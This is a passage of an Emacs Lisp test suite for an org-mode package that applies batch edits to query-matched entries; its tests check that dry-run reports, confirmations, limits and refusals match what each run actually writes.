know which edits were never even tried."
  (unwind-protect
      (progn
        (defun org-agents-action/third! (phase name)
          "Fail on the third apply, whatever it is asked to do."
          (pcase phase
            ('plan (cons (org-entry-get nil name) "x"))
            ('apply
             (let ((n (1+ (or (get 'org-agents-action/third! 'count) 0))))
               (put 'org-agents-action/third! 'count n)
               (if (= n 3)
                   (error "org-agents-test: the third one fails")
                 (org-entry-put nil name "x"))))))
        ;; Two calls of one verb, so it has to say what it writes: one
        ;; action writes each field once, and without this declaration
        ;; both calls claim the same field and the parse refuses them.
        (put 'org-agents-action/third! 'org-agents-action-field
             (lambda (args) (format "the property %s" (upcase (car args)))))
        (org-agents-test--at-agent "third!(P) third!(Q)"
          (org-agents-test--answering-yes (org-agents-apply-actions))
          (let ((lines (org-agents-test--action-edit-lines)))
            (should (= 4 (length lines)))
            (should (string-match-p "  applied\\'" (nth 0 lines)))
            (should (string-match-p "  applied\\'" (nth 1 lines)))
            (should (string-match-p "FAILED" (nth 2 lines)))
            (should (string-match-p "  not attempted\\'" (nth 3 lines))))))
    (put 'org-agents-action/third! 'count nil)
    (put 'org-agents-action/third! 'org-agents-action-field nil)
    (fmakunbound 'org-agents-action/third!)))

(ert-deftest org-agents-test-action-saves-nothing ()
  "After a full apply every modified buffer is still modified, and no file changed.
That is what actually bounds the blast radius of a bad run: N modified
buffers, reviewable and undoable one at a time, and not N modified files.

Mutation that must fail it: add a `save-buffer' \"for convenience\"."
  (org-agents-test--at-agent "set-property!(REVIEWED, today)"
    (let ((disk (org-agents-test--file-text a)))
      (org-agents-test--answering-yes (org-agents-apply-actions))
      (should (buffer-modified-p (find-file-noselect a)))
      (should (equal disk (org-agents-test--file-text a)))
      ;; And the change really is in the buffer, so the file's sameness is
      ;; the absence of a save rather than the absence of an edit.
      (should (string-match-p ":REVIEWED:"
                              (with-current-buffer (find-file-noselect a)
                                (buffer-string)))))))

(ert-deftest org-agents-test-action-reports-modified-buffers ()
  "The closing message names the counts and every buffer that was written.
A summary saying only how many had failed would leave the user to find
out which, and the buffers are what there is to review and undo.

Mutation that must fail it: drop the buffer names."
  (org-agents-test--at-agent "set-property!(REVIEWED, today)"
    (let ((messages (org-agents-test--messages
                      (org-agents-test--answering-yes
                        (org-agents-apply-actions)))))
      (let ((closing (car (last messages))))
        (should (string-match-p "applied 2" closing))
        (should (string-match-p "modified a\\.org" closing))
        (should (string-match-p "nothing was saved" closing))))))

(ert-deftest org-agents-test-action-planner-that-writes-is-caught ()
  "A `plan' phase that writes is caught, named, and nothing is applied.
The tick tripwire, and it is what makes the dry run's honesty a property
of the machinery rather than of a verb author's discipline.

MEASURED, and this is why the guard is the tick: `buffer-read-only'
cannot be used.  `org-entry-put' wraps its body in `org-no-read-only',
which binds `inhibit-read-only', so a read-only buffer does not stop it
-- while `org-todo', `org-set-tags', `org-schedule', `org-priority' and
`org-entry-delete' all signal.  The tick moved for that same suppressed
write, and does not move for a pass of pure reads.

Mutations that must fail it: drop the tripwire; use `buffer-read-only'
instead of the tick."
  (unwind-protect
      (progn
        (defun org-agents-action/sneaky! (phase name)
          "A verb whose `plan' phase writes, which is what must be caught."
          (org-entry-put nil name "written by the planner")
          (pcase phase
            ('plan (cons nil "written by the planner"))
            ('apply (org-entry-put nil name "written by the planner"))))
        (org-agents-test--at-agent "sneaky!(SNEAK)"
          (let ((err (should-error
                      (org-agents-test--answering-yes (org-agents-apply-actions))
                      :type 'user-error)))
            (should (string-match-p "sneaky!" (error-message-string err)))
            (should (string-match-p "modified" (error-message-string err)))
            (should (string-match-p "nothing was applied"
                                    (error-message-string err))))
          ;; The planner's own write is still there -- it is a bug in that
          ;; verb, not something this can undo -- but only ONE entry was
          ;; reached, because the command stopped at the first offence.
          (should (org-agents-test--action-property a "Fix widget" "SNEAK"))
          (should-not (org-agents-test--action-property a "Fix gadget"
                                                        "SNEAK"))))
    (fmakunbound 'org-agents-action/sneaky!)))

(ert-deftest org-agents-test-action-refuses-over-the-limit ()
  "Over `org-agents-action-limit' the run is refused, and nothing is planned.
Refused and not truncated: a truncated plan applies a subset nobody can
predict, which is worse than a refusal naming the number.  The refusal
quotes the entry count, the limit and the option, and it fires before the
planner runs -- so a refused run costs the match and nothing more.

Mutations that must fail it: truncate instead of refusing; gate on edits
instead of entries."
  (org-agents-test--at-agent "set-property!(REVIEWED, today) tag!(+reviewed)"
    (let ((org-agents-action-limit 1))
      (org-agents-test--with-verb-tripwire
        (let ((err (should-error
                    (org-agents-test--answering-yes (org-agents-apply-actions))
                    :type 'user-error)))
          (should (string-match-p "2 entries matched"
                                  (error-message-string err)))
          (should (string-match-p "org-agents-action-limit"
                                  (error-message-string err)))
          (should (string-match-p " is 1" (error-message-string err))))
        (should (= 0 org-agents-test--verb-calls))))
    ;; The gate is on ENTRIES and not on edits: four edits at two entries
    ;; is allowed by a limit of two.
    (let ((org-agents-action-limit 2))
      (org-agents-test--answering-no (org-agents-apply-actions))
      (should (= 4 (length (org-agents-test--action-edit-lines)))))))

(ert-deftest org-agents-test-action-limit-nil-is-no-limit ()
  "Nil means no limit, and not a limit of zero.
Mutation that must fail it: treat nil as 0."
  (org-agents-test--at-agent "set-property!(REVIEWED, today)"
    (let ((org-agents-action-limit nil))
      (org-agents-test--answering-no (org-agents-apply-actions))
      (should (= 2 (length (org-agents-test--action-edit-lines)))))))

(ert-deftest org-agents-test-action-explicit-set-is-the-region ()
  "With a prefix argument the targets are the entries the region's links name.
This is what makes a stamp fall out of the command: a stamp is this
command pointed at a selection, and the region is the selection.  The
action text still comes from the AGENT'S own drawer -- the aliases in the
region carry none, and would not be read if they did.

Point has to be in the AGENT'S OWN entry, because that is where the
action is read from, and that is not a limitation of the region: for a
list or a table the rendered block sits inside the agent's own entry, so
selecting rows of it is the natural gesture and point never leaves the
agent.  Tested here on the fixture's list-view agent for that reason,
and then again on a `children' agent -- where the aliases are entries of
their own, so the gesture is point on the agent's heading and the region
reaching down over them.

Mutations that must fail it: read the action from the alias; ignore the
region."
  ;; A list view: the block is inside the agent, so point is too.
  (org-agents-test--with-action-corpus "set-property!(REVIEWED, today)"
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (should (re-search-forward "^\\* Review list" nil t))
      (org-agents-test--answering-yes (org-agents-update))
      (goto-char (point-min))
      (should (re-search-forward "Fix widget" nil t))
      (push-mark (line-end-position) t t)
      (goto-char (line-beginning-position))
      (org-agents-test--answering-yes (org-agents-apply-actions t))
      ;; One entry, the one the region's link names.
      (should (equal (format-time-string (org-time-stamp-format nil t))
                     (org-agents-test--action-property a "Fix widget"
                                                       "REVIEWED")))
      (should-not (org-agents-test--action-property a "Fix gadget" "REVIEWED"))
      (should (= 1 (length (org-agents-test--action-edit-lines))))))
  ;; A children view: point on the agent, the region over its aliases.
  (org-agents-test--at-agent "set-property!(REVIEWED, today)"
    (org-agents-test--answering-yes (org-agents-update))
    (goto-char (point-min))
    (should (re-search-forward "Fix gadget" nil t))
    (push-mark (line-end-position) t t)
    (goto-char (point-min))
    (org-agents-test--answering-yes (org-agents-apply-actions t))
    ;; Both aliases are inside the region this time, so both entries are
    ;; planned -- which is the answer the region gave.
    (should (org-agents-test--action-property a "Fix widget" "REVIEWED"))
    (should (org-agents-test--action-property a "Fix gadget" "REVIEWED"))
    (should (= 2 (length (org-agents-test--action-edit-lines))))))

(ert-deftest org-agents-test-action-explicit-set-needs-a-region ()
  "A prefix argument with no region says so rather than acting on everything.
The failure mode this closes is the worst kind of convenience: a command
that quietly widened its own scope when the selection it was told to use
turned out to be empty."
  (org-agents-test--at-agent "set-property!(REVIEWED, today)"
    (org-agents-test--with-verb-tripwire
      (let ((err (should-error (org-agents-apply-actions t) :type 'user-error)))
        (should (string-match-p "there is no region"
                                (error-message-string err))))
      (should (= 0 org-agents-test--verb-calls))
      ;; A mark at point is a region of nothing, and is refused as one
      ;; rather than read as a licence to act on everything.
      (push-mark (point) t t)
      (let ((err (should-error (org-agents-apply-actions t) :type 'user-error)))
        (should (string-match-p "region is empty"
                                (error-message-string err))))
      (should (= 0 org-agents-test--verb-calls)))))

(ert-deftest org-agents-test-action-no-action-property ()
  "An agent with a query and no action says so, and runs no query.
The read is step 1 and the match is step 3, so a command that has nothing
to do costs nothing at all.

Mutation that must fail it: read the action after collecting."
  (org-agents-test--at-agent nil
    (let ((collected 0))
      (cl-letf (((symbol-function 'org-agents--collect)
                 (lambda (&rest _)
                   (setq collected (1+ collected))
                   (error "org-agents-test: the query was run"))))
        (let ((err (should-error (org-agents-apply-actions)
                                 :type 'user-error)))
          (should (string-match-p "no :AGENT_ACTION: at point"
                                  (error-message-string err)))))
      (should (= 0 collected))))
  ;; And with no agent at all it names that instead.
  (org-agents-test--with-action-corpus nil
    (with-current-buffer (find-file-noselect b)
      (goto-char (point-min))
      (let ((err (should-error (org-agents-apply-actions) :type 'user-error)))
        (should (string-match-p "no agent at point"
                                (error-message-string err)))))))

(ert-deftest org-agents-test-action-dead-marker-is-reported ()
  "A match whose buffer was killed is reported, and the run goes on.
Reported rather than dropped: a target that silently disappeared would
make the report understate the match set, and the count in the header
would disagree with the query.

Mutation that must fail it: drop the target silently."
  (org-agents-test--at-agent "set-property!(REVIEWED, today)"
    ;; The markers are made, and then the buffer they point into is killed.
    (cl-letf* ((real (symbol-function 'org-agents--action-targets))
               ((symbol-function 'org-agents--action-targets)
                (lambda (&rest args)
                  (let ((targets (apply real args)))
                    (dolist (buffer (buffer-list))
                      (when (equal (buffer-file-name buffer) a)
                        (with-current-buffer buffer
                          (set-buffer-modified-p nil))
                        (kill-buffer buffer)))
                    targets))))
      (org-agents-test--answering-yes (org-agents-apply-actions)))
    (let ((lines (org-agents-test--action-report-lines)))
      (should (= 2 (cl-count-if
                    (lambda (line)
                      (string-match-p "skipped: no live buffer" line))
                    lines))))))

(ert-deftest org-agents-test-action-counts-unopened-files ()
  "The question names how many of the files were not open when it was asked.
Someone about to edit a file they have never opened should be told so in
the sentence they answer, not in a paragraph of README -- and after the
query there is nothing left to ask, because matching opens them.

Mutation that must fail it: omit the count, or take it after the match."
  (org-agents-test--at-agent "set-property!(REVIEWED, today)"
    ;; a.org is not visited yet, and the match is about to open it.
    (dolist (buffer (buffer-list))
      (when (equal (buffer-file-name buffer) a)
        (with-current-buffer buffer (set-buffer-modified-p nil))
        (kill-buffer buffer)))
    (let ((asked nil)
          (noninteractive nil)
          (inhibit-interaction nil))
      (cl-letf (((symbol-function 'y-or-n-p)
                 (lambda (prompt) (push prompt asked) nil))
                ((symbol-function 'yes-or-no-p) (lambda (&rest _) t)))
        (org-agents-apply-actions))
      (should (= 1 (length asked)))
      (should (string-match-p "1 not open before this ran" (car asked))))))

(ert-deftest org-agents-test-action-prompt-names-the-destructive-verbs ()
  "The one question names the destructive verbs in the plan.
The two things a reader of a long report might not have noticed -- what
is destructive and what was not open -- belong in the sentence being
answered."
  (org-agents-test--at-agent "delete-property!(NEXT_REVIEW)"
    (let ((asked nil)
          (noninteractive nil)
          (inhibit-interaction nil))
      (cl-letf (((symbol-function 'y-or-n-p)
                 (lambda (prompt) (push prompt asked) nil))
                ((symbol-function 'yes-or-no-p) (lambda (&rest _) t)))
        (org-agents-apply-actions))
      (should (string-match-p "including the destructive delete-property!"
                              (car asked))))))

(ert-deftest org-agents-test-action-nothing-matched-says-so ()
  "An action whose query matches nothing says that, and plans nothing.
A report with no lines in it looks like a broken command, and a
confirmation about zero edits is a question with no answer worth giving."
  (org-agents-test--at-agent "set-property!(REVIEWED, today)"
    (org-entry-put nil "AGENT_QUERY" "(property \"NOTHING_HAS_THIS\")")
    (org-agents-test--with-verb-tripwire
      (let ((err (should-error (org-agents-apply-actions) :type 'user-error)))
        (should (string-match-p "nothing matched" (error-message-string err))))
      (should (= 0 org-agents-test--verb-calls)))))

(ert-deftest org-agents-test-action-report-shows-old-and-new ()
  "Each line shows the call as the property spells it, and `old -> new'.
The report is what is agreed to, so what it shows has to be readable
against the file: the verb and its arguments as written, then the value
that is there now and the value that would replace it."
  (org-agents-test--at-agent
      "set-property!(REVIEWED, today) tag!(+reviewed -api) effort!(0:30)"
    (org-agents-test--answering-no (org-agents-apply-actions))
    (let ((lines (org-agents-test--action-edit-lines))
          (stamp (format-time-string (org-time-stamp-format nil t))))
      (should (= 6 (length lines)))
      (should (cl-find-if
               (lambda (line)
                 (and (string-match-p "set-property!(REVIEWED, today)" line)
                      (string-match-p (concat "nil -> " (regexp-quote stamp))
                                      line)))
               lines))
      (should (cl-find-if
               (lambda (line)
                 (and (string-match-p "tag!(\\+reviewed -api)" line)
                      (string-match-p ":api: -> :reviewed:" line)))
               lines))
      (should (cl-find-if
               (lambda (line)
                 (and (string-match-p "effort!(0:30)" line)
                      (string-match-p "nil -> 0:30" line)))
               lines)))))

;;;; Actions: what the report says is what the run did

;; Every test in this section came out of an adversarial pass over the
;; shipped feature, and every one of them names the measurement that
;; found the hole.  They share one subject: the dry run is the sentence
;; the user answered, so a run that writes anything the report does not
;; name -- a file on disk, an entry outside the match set, a value other
;; than the one on the line -- has broken the only promise this feature
;; has to keep.

(ert-deftest org-agents-test-action-archive-saves-no-file ()
  "`archive!' leaves the archive in a BUFFER, and puts no file on disk.
MEASURED, with the stock default: `org-archive-subtree' ends with
`save-buffer' on the archive file because
`org-archive-subtree-save-file-p' defaults to `from-org', so a confirmed
`archive!' wrote `a.org_archive' to disk while the command's own summary
said `nothing was saved' -- and `undo' in the source buffer cannot take
a file back off the disk.  The archive buffer is also NAMED in the
summary, because it is one of the buffers there is now something to
review and save by hand.

Mutations that must fail it: drop the `org-archive-subtree-save-file-p'
binding from `org-agents--with-action-quiet-hooks'; report only the
buffer the row names."
  (should (eq 'from-org (default-value 'org-archive-subtree-save-file-p)))
  (org-agents-test--at-agent "archive!"
    (let ((said nil))
      (cl-letf (((symbol-function 'message)
                 (lambda (format &rest args)
                   (setq said (apply #'format format args)))))
        (org-agents-test--answering-yes (org-agents-apply-actions)))
      (should-not (file-exists-p (concat a "_archive")))
      (let ((archive (get-file-buffer (concat a "_archive"))))
        (should archive)
        (should (buffer-modified-p archive))
        (should (string-match-p (regexp-quote (buffer-name archive)) said)))
      (should (string-match-p "nothing was saved" said)))))

(ert-deftest org-agents-test-action-todo-refuses-a-repeater ()
  "`todo!' refuses a repeating entry, naming it, and writes nothing at all.
MEASURED on `* TODO Item / SCHEDULED: <2020-01-01 Wed +1w>' with the verb
as first shipped: the report line read `todo!(DONE)  TODO -> DONE
applied', and the entry afterwards was still `TODO', with its stamp moved
to `<2020-01-08 Wed +1w>' and a `:LAST_REPEAT:' property it did not have
before.  Two unreported edits and an outcome the entry never reached.
The refusal is raised in the `plan' phase, so nothing is written and no
entry is half done.

Mutation that must fail it: drop the `org-get-repeat' check."
  (org-agents-test--at-agent "todo!(DONE)"
    (with-current-buffer (find-file-noselect a)
      (org-with-wide-buffer
       (goto-char (point-min))
       (should (re-search-forward "^\\*+.*Fix widget" nil t))
       (end-of-line)
       (insert "\nSCHEDULED: <2020-01-01 Wed +1w>")))
    (let ((before (org-agents-test--action-corpus-snapshot a)))
      (let ((err (should-error
                  (org-agents-test--answering-yes (org-agents-apply-actions))
                  :type 'user-error)))
        (should (string-match-p "repeating entry" (error-message-string err)))
        (should (string-match-p "LAST_REPEAT" (error-message-string err)))
        (should (string-match-p "a.org:1" (error-message-string err))))
      (should (equal before (org-agents-test--action-corpus-snapshot a))))))

(ert-deftest org-agents-test-action-set-property-refuses-a-planted-agent ()
  "`set-property!' will not write an `AGENT_' name, `PROTOTYPE' or `ARCHIVE'.
MEASURED: `set-property!(\"AGENT_QUERY\", \"(todo)\")
set-property!(\"AGENT_ACTION\", \"archive!\")' left both properties on a
matched entry -- one confirmed action turning every entry it matched into
an agent carrying its own action, written into files the user never
edited.  That is the per-file trust the non-inheritance rule exists to
keep, undone by a verb.  `ARCHIVE' is refused for a different measured
reason: it steers where `archive!' puts the subtree, and the dry run
names the destination read before that.

Mutation that must fail it: check only `org-special-properties'."
  (org-agents-test--with-action-corpus nil
    (org-agents-test--at-match
      (dolist (name '("AGENT_QUERY" "AGENT_ACTION" "AGENT_MATCH" "PROTOTYPE"
                      "agent_query" "prototype" "ARCHIVE" "archive"))
        (let ((err (should-error
                    (org-agents-action/set-property! 'plan name "x")
                    :type 'user-error)))
          (should (string-match-p (regexp-quote name)
                                  (error-message-string err))))
        (should-error (org-agents-action/set-property! 'apply name "x")
                      :type 'user-error))
      ;; A name that merely CONTAINS one of them is not one of them.
      (should (org-agents-action/set-property! 'plan "MY_AGENT_NOTE" "x"))
      (should (org-agents-action/set-property! 'plan "PROTOTYPES" "x")))))

(ert-deftest org-agents-test-action-archive-destination-is-checked-again ()
  "`archive!' will not archive anywhere the dry run did not name.
MEASURED, before this check existed: `set-property!(\"ARCHIVE\",
\"/elsewhere.org::\") archive!' reported the innocuous default
destination next to the source file and wrote -- and saved -- the subtree
to the other one, because the whole plan is computed before any row is
applied.  `set-property!' now refuses the name outright; this is the lock
that holds however the value arrived, including an inherited property
changed between the report and the answer, which is what the stub below
does: the confirmation is asked in exactly that gap.

Mutation that must fail it: archive without recomputing the destination."
  (org-agents-test--at-agent "archive!"
    (let ((elsewhere (expand-file-name "elsewhere.org" dir))
          (noninteractive nil)
          (inhibit-interaction nil))
      (cl-letf (((symbol-function 'y-or-n-p)
                 (lambda (&rest _)
                   (org-agents-test--put-property
                    a "Fix widget" "ARCHIVE" (concat elsewhere "::"))
                   t))
                ((symbol-function 'yes-or-no-p) (lambda (&rest _) t)))
        (org-agents-apply-actions))
      (should-not (file-exists-p elsewhere))
      (should-not (get-file-buffer elsewhere))
      (let ((lines (org-agents-test--action-edit-lines)))
        (should (string-match-p "FAILED" (nth 0 lines)))
        (should (string-match-p "elsewhere.org" (nth 0 lines)))
        (should (string-match-p "not attempted" (nth 1 lines))))
      ;; And the subtree is still where it was.
      (should (string-match-p
               "Fix widget"
               (with-current-buffer (find-file-noselect a) (buffer-string)))))))

(ert-deftest org-agents-test-action-apply-runs-no-user-hook ()
  "Applying a verb runs no hook and writes no log the report did not name.
MEASURED, through the real command: one function on
`org-after-todo-state-change-hook' that wrote a property left
`:TRIGGERED:' on an entry the query never matched, while the report said
`1 edit at 1 entry in 1 file'; and `org-log-done' `time' added a
`CLOSED:' line no line of the report named.  `org-trigger-hook' is
org-edna's own mechanism, so a corpus with `org-edna-mode' on would have
scheduled successors and flipped blockers in other files -- unreported,
and uncounted against `org-agents-action-limit'.

Mutation that must fail it: drop a binding from
`org-agents--with-action-quiet-hooks'."
  (org-agents-test--at-agent "todo!(DONE)"
    (let ((ran nil)
          (org-log-done 'time)
          (org-after-todo-state-change-hook
           (list (lambda ()
                   (push 'state-change ran)
                   (org-entry-put nil "TRIGGERED" "yes"))))
          (org-trigger-hook (list (lambda (_) (push 'trigger ran))))
          (org-property-changed-functions
           (list (lambda (&rest _) (push 'property ran)))))
      (org-agents-test--answering-yes (org-agents-apply-actions))
      (should-not ran)
      (should (equal "DONE"
                     (org-agents-test--action-property a "Fix widget" "TODO")))
      (should-not (org-agents-test--action-property a "Fix widget" "CLOSED"))
      (should-not (org-agents-test--action-property a "Fix widget" "TRIGGERED"))
      (should-not (string-match-p
                   "CLOSED:"
                   (with-current-buffer (find-file-noselect a)
                     (buffer-string)))))))

(ert-deftest org-agents-test-action-planner-that-writes-elsewhere-is-caught ()
  "The dry-run tripwire covers every buffer, not just the one being planned at.
MEASURED, when the tick was read per buffer: a verb whose `plan' arm
wrote into ANOTHER buffer -- a shared scratch, an index, a log --
completed the command with no error at all and left that buffer modified,
including on the runs the user cancelled.  What
`org-agents--action-plan' promises is that the pass writes NOWHERE.

Mutation that must fail it: compare the tick of the planned entry's
buffer alone."
  (let ((victim (get-buffer-create "*org-agents-test-victim*")))
    (unwind-protect
        (progn
          (defun org-agents-action/elsewhere! (phase name)
            "A verb whose `plan' arm writes into another buffer."
            (when-let* ((buffer (get-buffer "*org-agents-test-victim*")))
              (with-current-buffer buffer (insert "the planner wrote here\n")))
            (pcase phase
              ('plan (cons nil name))
              ('apply (org-entry-put nil name "x"))))
          (org-agents-test--at-agent "elsewhere!(SNEAK)"
            (let ((err (should-error
                        (org-agents-test--answering-yes
                          (org-agents-apply-actions))
                        :type 'user-error)))
              (should (string-match-p "elsewhere!" (error-message-string err)))
              (should (string-match-p "victim" (error-message-string err)))
              (should (string-match-p "nothing was applied"
                                      (error-message-string err))))
            (should-not (org-agents-test--action-property a "Fix widget"
                                                          "SNEAK"))))
      (fmakunbound 'org-agents-action/elsewhere!)
      (kill-buffer victim))))

(ert-deftest org-agents-test-action-parse-refuses-two-writes-of-one-field ()
  "One action writes each field once, and the refusal names both verbs.
MEASURED: `tag!(+alpha) tag!(+beta)' at an entry tagged `:api:' reported
`:api: -> :api:beta:' on its second line and left the entry
`:api:alpha:beta:' -- a report that showed LESS change than the run made,
because every planner runs against the state the run began in.  Refused
by the parser, before the corpus is opened.

Mutations that must fail it: drop the field check; give
`delete-property!' a field of its own."
  (dolist (text '("tag!(+a) tag!(-b)"
                  "set-property!(P, 1) set-property!(P, 2)"
                  "set-property!(P, 1) delete-property!(P)"
                  "set-property!(p, 1) set-property!(P, 2)"
                  "todo!(DONE) todo!(TODO)"
                  "priority!(A) priority!(B)"
                  "scheduled!(today) scheduled!(+7d)"
                  "effort!(0:30) set-property!(Effort, 1:00)"))
    (let ((err (should-error (org-agents--parse-actions text)
                             :type 'user-error)))
      (should (string-match-p "each field once" (error-message-string err)))))
  ;; Different fields, and a whole action of them, parse.
  (should (= 4 (length (org-agents--parse-actions
                        (concat "set-property!(P, 1) delete-property!(Q)"
                                " tag!(+a) todo!(DONE)")))))
  ;; A verb defined in init says what it writes with the same property,
  ;; and without one every call of it claims the same field.
  (unwind-protect
      (progn
        (defun org-agents-action/twice! (phase name)
          "A verb used twice in one action."
          (pcase phase
            ('plan (cons (org-entry-get nil name) "x"))
            ('apply (org-entry-put nil name "x"))))
        (should-error (org-agents--parse-actions "twice!(P) twice!(Q)")
                      :type 'user-error)
        (put 'org-agents-action/twice! 'org-agents-action-field
             (lambda (args) (upcase (car args))))
        (should (= 2 (length (org-agents--parse-actions
                              "twice!(P) twice!(Q)"))))
        (should-error (org-agents--parse-actions "twice!(P) twice!(p)")
                      :type 'user-error))
    (put 'org-agents-action/twice! 'org-agents-action-field nil)
    (fmakunbound 'org-agents-action/twice!)))

(ert-deftest org-agents-test-action-nothing-to-do-is-not-an-edit ()
  "A row that would change nothing is not counted, not asked about, not applied.
MEASURED: `delete-property!(ABSENT)' at an entry without the property
reported `1 edit at 1 entry in 1 file' and, because the verb is
destructive, asked a `y-or-n-p' about deleting nothing.  Over ninety
matched entries of which four carry the property, that is ninety
confirmations, eighty-six of them about nothing, in the one sentence the
design leans on for informed consent.

Mutations that must fail it: count a no-op as an edit; ask about one."
  (org-agents-test--at-agent "delete-property!(ABSENT)"
    (let ((asked 0)
          (before (org-agents-test--action-corpus-snapshot a))
          (noninteractive nil)
          (inhibit-interaction nil))
      (cl-letf (((symbol-function 'y-or-n-p)
                 (lambda (&rest _) (setq asked (1+ asked)) t))
                ((symbol-function 'yes-or-no-p) (lambda (&rest _) t)))
        (org-agents-apply-actions))
      (should (= 0 asked))
      (should (equal before (org-agents-test--action-corpus-snapshot a)))
      (let ((lines (org-agents-test--action-report-lines)))
        (should (string-match-p "0 edits at 0 entries" (car lines)))
        (should (string-match-p "2 with nothing to do" (car lines)))
        (should (string-match-p "THERE IS NOTHING TO DO" (car lines)))
        (should (= 2 (cl-count-if
                      (lambda (line) (string-match-p "nothing to do\\'" line))
                      (cdr lines))))))))

(ert-deftest org-agents-test-action-report-shows-an-empty-value-as-one ()
  "An empty value is `\"\"' on the line, and nothing at all is `nil'.
MEASURED: removing a tag an entry only INHERITS is correctly a no-op, and
the line for it read `tag!(-inherited)   ->  ' -- nothing on either side
of the arrow, which reads as a truncated line rather than as the no-op it
is.  The behaviour was right and the report was unreadable exactly where
it mattered most.

Mutation that must fail it: print the empty string as the empty string."
  (should (equal "nil" (org-agents--action-side nil)))
  (should (equal "\"\"" (org-agents--action-side "")))
  (should (equal ":a:" (org-agents--action-side ":a:")))
  ;; And in a real report: removing the only tag an entry has empties the
  ;; set, and the line has to show that it did.
  (org-agents-test--at-agent "tag!(-api)"
    (org-agents-test--answering-no (org-agents-apply-actions))
    (let ((lines (org-agents-test--action-edit-lines)))
      (should (= 2 (length lines)))
      (should (cl-find-if
               (lambda (line) (string-match-p ":api: -> \"\"\\'" line))
               lines))
      (should (cl-find-if
               (lambda (line) (string-match-p ":api:stale: -> :stale:\\'" line))
               lines))))
  ;; A row whose two sides are equal is marked in the PLANNED report,
  ;; before anything is answered -- which is where a reader needs to know
  ;; which of the lines would write nothing.
  (org-agents-test--at-agent "tag!(-absent)"
    (org-agents-test--answering-no (org-agents-apply-actions))
    (should (= 2 (cl-count-if
                  (lambda (line) (string-match-p "nothing to do\\'" line))
                  (org-agents-test--action-report-lines))))))

(ert-deftest org-agents-test-action-report-quotes-a-quoted-argument ()
  "A quoted argument is printed quoted, because the two spellings differ.
MEASURED: `set-property!(R, \"today\") set-property!(S, today)' printed
`set-property!(R, today)' and `set-property!(S, today)' -- two identical
call texts for two different operations, one storing five letters and one
stamping a date.  An auditor reading the dry run could not tell which
line did which.

Mutation that must fail it: strip the quoting mark and print the text."
  (org-agents-test--at-agent
      "set-property!(R, \"today\") set-property!(S, today)"
    (org-agents-test--answering-no (org-agents-apply-actions))
    (let ((lines (org-agents-test--action-edit-lines))
          (stamp (format-time-string (org-time-stamp-format nil t))))
      (should (cl-find-if
               (lambda (line)
                 (and (string-match-p "set-property!(R, \"today\")" line)
                      (string-match-p "nil -> today\\'" line)))
               lines))
      (should (cl-find-if
               (lambda (line)
                 (and (string-match-p "set-property!(S, today)" line)
                      (string-match-p (concat "nil -> " (regexp-quote stamp))
                                      line)))
               lines))
      ;; An escaped quote inside a quoted argument comes back escaped.
      (should (equal "\"a \\\"b\\\" c\""
                     (org-agents--action-arg-text
                      (propertize "a \"b\" c" 'org-agents-action-quoted t)))))))

(ert-deftest org-agents-test-action-destructive-no-at-the-entry-stops-there ()
  "A `no' at a destructive ENTRY is honoured, and nothing after it is tried.
The prompt count alone cannot see this: MEASURED, a mutation that asked
at every entry and then discarded the answer -- `(not (or (confirm ...)
t))' -- passed the whole suite, because the test that answers `no'
answers it to the WHOLE-PLAN question and never reaches the per-entry
one, and the test that counts the prompts answers yes throughout.  So
this one answers YES to the plan and NO to the entry, which is the only
way to tell an honoured answer from a decorative prompt.

Mutation that must fail it: ignore the per-entry answer."
  (org-agents-test--at-agent "delete-property!(OWNER)"
    (org-agents-test--put-property a "Fix widget" "OWNER" "ada")
    (org-agents-test--put-property a "Fix gadget" "OWNER" "grace")
    (let ((asked nil)
          (before (org-agents-test--action-corpus-snapshot a))
          (noninteractive nil)
          (inhibit-interaction nil))
      (cl-letf (((symbol-function 'y-or-n-p)
                 (lambda (prompt)
                   (push prompt asked)
                   ;; Yes to the plan, no to the entry.
                   (not (string-match-p "apply it" prompt))))
                ((symbol-function 'yes-or-no-p) (lambda (&rest _) t)))
        (org-agents-apply-actions))
      (should (= 2 (length asked)))
      (let ((lines (org-agents-test--action-edit-lines)))
        (should (= 2 (length lines)))
        (should (string-match-p "  refused\\'" (nth 0 lines)))
        (should (string-match-p "  not attempted\\'" (nth 1 lines))))
      ;; Both properties are still there, in the buffer as well as on disk.
      (should (equal "ada"
                     (org-agents-test--action-property a "Fix widget" "OWNER")))
      (should (equal "grace"
                     (org-agents-test--action-property a "Fix gadget" "OWNER")))
      (should (equal before (org-agents-test--action-corpus-snapshot a))))))

(ert-deftest org-agents-test-action-quit-mid-apply-stops-and-says-so ()
  "A `C-g' in the middle of a run stops it, and the report accounts for it.
MEASURED, with the `quit' arm replaced by `(quit nil)': the whole suite
stayed green while the command carried on past the interruption and left
the remaining rows with no outcome at all, calling them `skipped' in the
summary.  A user who hits `C-g' at edit twelve of sixty has to be able to
read what happened from the report.

Mutation that must fail it: swallow the quit and continue."
  (unwind-protect
      (progn
        (defun org-agents-action/quitter! (phase name)
          "Signal `quit' on the second apply, as a `C-g' would."
          (pcase phase
            ('plan (cons (org-entry-get nil name) "x"))
            ('apply
             (let ((n (1+ (or (get 'org-agents-action/quitter! 'count) 0))))
               (put 'org-agents-action/quitter! 'count n)
               (if (= n 2) (signal 'quit nil)
                 (org-entry-put nil name "x"))))))
        (put 'org-agents-action/quitter! 'org-agents-action-field
             (lambda (args) (upcase (car args))))
        (org-agents-test--at-agent "quitter!(P) quitter!(Q)"
          (let ((said nil))
            (cl-letf (((symbol-function 'message)
                       (lambda (format &rest args)
                         (setq said (apply #'format format args)))))
              (org-agents-test--answering-yes (org-agents-apply-actions)))
            (let ((lines (org-agents-test--action-edit-lines)))
              (should (= 4 (length lines)))
              (should (string-match-p "  applied\\'" (nth 0 lines)))
              (should (string-match-p "  interrupted\\'" (nth 1 lines)))
              (should (string-match-p "  not attempted\\'" (nth 2 lines)))
              (should (string-match-p "  not attempted\\'" (nth 3 lines))))
            ;; An interruption counts as a failure, not as a skip.
            (should (string-match-p "applied 1" said))
            (should (string-match-p "failed 1" said))
            (should (string-match-p "2 not attempted" said)))
          ;; The second entry was never touched.
          (should-not (org-agents-test--action-property a "Fix gadget" "P"))))
    (put 'org-agents-action/quitter! 'count nil)
    (put 'org-agents-action/quitter! 'org-agents-action-field nil)
    (fmakunbound 'org-agents-action/quitter!)))

(ert-deftest org-agents-test-action-an-entry-that-diverges-stops-the-run ()
  "An entry that did not end up as its line said stops the run, and says so.
The backstop, and it is what covers the failures nobody has thought of.
MEASURED, the two it was built from: `todo!' over a repeating entry left
